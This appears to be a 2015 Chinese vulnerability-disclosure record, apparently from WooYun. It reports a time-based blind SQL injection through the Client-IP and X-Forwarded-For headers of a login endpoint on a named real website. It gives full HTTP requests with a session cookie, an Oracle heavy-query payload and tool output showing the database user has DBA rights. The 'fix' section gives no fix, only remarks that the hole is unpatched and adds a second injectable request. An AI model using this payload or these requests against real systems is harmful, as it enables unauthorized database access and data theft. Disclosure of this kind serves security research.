wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-06-25：	细节已通知厂商并且等待厂商处理中									2015-06-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 233 详细说明：  
GET /usermanage/login/url/ HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoClient-IP: *X-Requested-With: XMLHttpRequestReferer: http://service.caijing.com.cn/usermanage/login/Cookie: PHPSESSID=7881f75dc78f4c8e3745498115de0f95Host: service.caijing.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*
   漏洞证明：  
---Parameter: Client-IP #1* ((custom) HEADER)    Type: AND/OR time-based blind    Title: Oracle OR time-based blind (heavy query)    Payload: ' OR 2968=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'qkOh'='qkOh---web application technology: PHP 5.2.6, Nginxback-end DBMS: Oraclecurrent user:    'CJSERVICE'current user is DBA:    Trueavailable databases [1]:[*] CJSERVICE
   修复方案：  
要不要说，这个还没修复！GET /usermanage/login/url/ HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoX-Forwarded-For: *X-Requested-With: XMLHttpRequestReferer: http://service.caijing.com.cn/usermanage/login/Cookie: PHPSESSID=7881f75dc78f4c8e3745498115de0f95Host: service.caijing.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*
